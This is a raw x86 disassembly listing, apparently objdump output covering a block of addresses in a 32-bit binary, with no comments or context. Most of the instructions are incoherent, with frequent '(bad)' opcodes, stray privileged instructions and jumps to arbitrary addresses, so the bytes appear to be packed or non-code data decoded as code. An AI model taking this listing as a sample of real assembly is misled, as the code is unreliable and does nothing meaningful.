  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
